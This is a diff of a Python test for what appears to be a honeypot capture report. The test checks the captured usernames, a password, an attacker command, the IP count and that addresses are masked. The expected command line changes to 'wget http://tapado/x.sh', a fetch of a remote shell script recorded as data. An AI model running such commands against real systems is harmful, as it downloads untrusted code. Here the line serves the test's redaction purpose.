@@ -107,7 +107,7 @@ def test_el_reporte_no_lleva_direcciones(sin_elastic: list[dict[str, Any]]) -> N
     captura = datos["captura"]
     assert [u["key"] for u in captura["usuarios"]] == ["root", "admin"]
     assert [c["key"] for c in captura["contrasenas"]] == ["123456"]
-    assert captura["comandos"][0]["key"] == "wget http://x.x.x.x/x.sh"
+    assert captura["comandos"][0]["key"] == "wget http://tapado/x.sh"
     assert captura["unique_ips"] == 101
     assert captura["por_hora"][3] == 15
     rango = sin_elastic[0]["query"]["bool"]["must"]
